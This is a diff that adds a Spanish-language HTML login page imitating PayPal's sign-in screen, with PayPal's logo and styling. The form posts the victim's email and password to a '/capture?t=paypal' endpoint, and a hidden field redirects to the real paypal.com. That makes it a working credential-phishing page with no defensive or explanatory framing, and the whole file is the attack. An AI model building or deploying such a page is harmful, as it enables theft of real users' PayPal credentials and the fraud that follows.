@@ -1,0 +1,30 @@
+  <!DOCTYPE html>
+  <html lang="es">
+  <head>
+    <meta charset="UTF-8">
+    <title>Iniciar sesión | PayPal ES</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <style>
+      body{margin:0;background:#f7f9fa;font-family:'PayPal Sans Big',Arial,sans-serif;color:#002c8a;height:100vh;display:flex;align-items:center;justify-content:center}
+      .container{max-width:400px;width:90%;background:#fff;padding:40px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.1)}
+      .logo{width:120px;margin-bottom:30px}
+      input{width:100%;padding:14px;margin:10px 0;border:1px solid #c7cdd1;border-radius:8px;font-size:16px}
+      input:focus{border-color:#0070ba;outline:none;box-shadow:0 0 0 3px rgba(0,112,186,0.2)}
+      button{background:#0070ba;color:#fff;padding:14px;border:none;border-radius:8px;width:100%;font-size:16px;font-weight:600;cursor:pointer}
+      button:hover{background:#005ea6}
+      .footer{font-size:12px;color:#666;margin-top:20px;text-align:center}
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <img src="https://www.paypalobjects.com/webstatic/en_US/i/logo/paypal_logo.svg" alt="PayPal" class="logo">
+      <form action="/capture?t=paypal" method="POST">
+        <input type="email" name="email" placeholder="Correo electrónico" required autocomplete="username">
+        <input type="password" name="password" placeholder="Contraseña" required autocomplete="current-password">
+        <button type="submit">Iniciar sesión</button>
+        <input type="hidden" name="redirect" value="https://www.paypal.com/es/home">
+      </form>
+      <div class="footer">© 1999–2025 PayPal</div>
+    </div>
+  </body>
+  </html>
